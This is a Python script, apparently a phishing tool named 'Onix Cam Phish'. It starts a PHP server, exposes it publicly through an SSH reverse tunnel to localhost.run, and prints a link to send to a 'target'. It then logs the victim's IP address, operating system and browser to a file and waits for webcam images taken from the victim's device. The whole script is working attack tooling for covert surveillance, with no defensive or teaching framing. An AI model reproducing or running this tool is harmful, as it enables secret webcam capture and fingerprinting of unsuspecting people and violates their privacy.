from colorama import Fore , init ;init()
from pathlib import Path
from time import sleep
import pandas as pd
import subprocess
import linecache
import random
import json
import sys
import os

#====================================================================================================
def php_server():
    with open("Server" , "w") as log:
        subprocess.Popen((f"php -S localhost:{port}"),stderr=log,stdout=log , shell=True)
#====================================================================================================
def loaclhost():
    global port

    with open("localhost.txt" , "w") as local:
        subprocess.Popen((f"ssh -R 80:localhost:{port} nokey@localhost.run"),stderr=local , stdout=local , shell=True)

#====================================================================================================
def Sprint(text):
  for character in text:
    sys.stdout.write(character)
    sys.stdout.flush()
    sleep(0.1)

#====================================================================================================

check = subprocess.call("php -v" , stdout=subprocess.DEVNULL , shell=True)

if check != 0:
    print (f"{Fore.RED}[-]{Fore.BLUE} Unfortunately you dont have PHP please install it and come back soon !")
    sys.exit()

#====================================================================================================
def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

clear()
sleep(0.1)

#Banner ====================================================================================================
Banner_color = (Fore.RED , Fore.MAGENTA , Fore.GREEN)


print(fr"""{random.choice(Banner_color)} 
                           
 ██████╗ ███╗   ██╗██╗██╗  ██╗     ██████╗ █████╗ ███╗   ███╗    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
██╔═══██╗████╗  ██║██║╚██╗██╔╝    ██╔════╝██╔══██╗████╗ ████║    ██╔══██╗██║  ██║██║██╔════╝██║  ██║
██║   ██║██╔██╗ ██║██║ ╚███╔╝     ██║     ███████║██╔████╔██║    ██████╔╝███████║██║███████╗███████║
██║   ██║██║╚██╗██║██║ ██╔██╗     ██║     ██╔══██║██║╚██╔╝██║    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║
╚██████╔╝██║ ╚████║██║██╔╝ ██╗    ╚██████╗██║  ██║██║ ╚═╝ ██║    ██║     ██║  ██║██║███████║██║  ██║
 ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                 
      {Fore.RESET}""")


#option 1 ====================================================================================================
def webcam():
    global port
#====================================================================================================
    try:
        port = input(Fore.MAGENTA + "\r\nwhich port want to open (default 80) : ".title() + Fore.RESET)
    except KeyboardInterrupt:
        exit(f"\r\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")

#====================================================================================================
    php_server()
    
    sleep(1)

    loaclhost()

    sleep(8)

#====================================================================================================
    line = linecache.getline(r"localhost.txt" , 24)
    print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , ").lstrip())
    linecache.clearcache()

    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".lstrip() + Fore.RESET)

#Write info====================================================================================================
    try:
        while True:
            size = os.stat("info.json")
            if size.st_size != 0:

                
                with open("info.json", "r") as read_file:
                    data = json.load(read_file)
                    
                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"  ])
                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                    
                    sleep(1)
                    df = pd.read_json(r"info.json")
                    sleep(1)
                    df.to_csv("Victim_info.txt", index=False , mode="a")

                    victim_file= open("victim_info.txt", "a")
                    victim_file.write("\n")
                    sleep(3)
                    open("info.json" , "w").close()
                    victim_file.close()

                    Sprint(Fore.YELLOW + "\r\nWaiting for images...".title() + Fore.RESET)
                    break

    except KeyboardInterrupt:
        exit(f"\r\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")

#====================================================================================================
   
    while True:
        folder = sum([f.stat().st_size for f in Path("../images").glob("**/*")])
        if folder != 0:
           print(Fore.GREEN + "\r\n\nI got the images !".title() + Fore.RESET)

           break

    if os.name == "nt":
        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
    else:
        subprocess.call("sudo kill php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()

if __name__ == "__main__":
    webcam()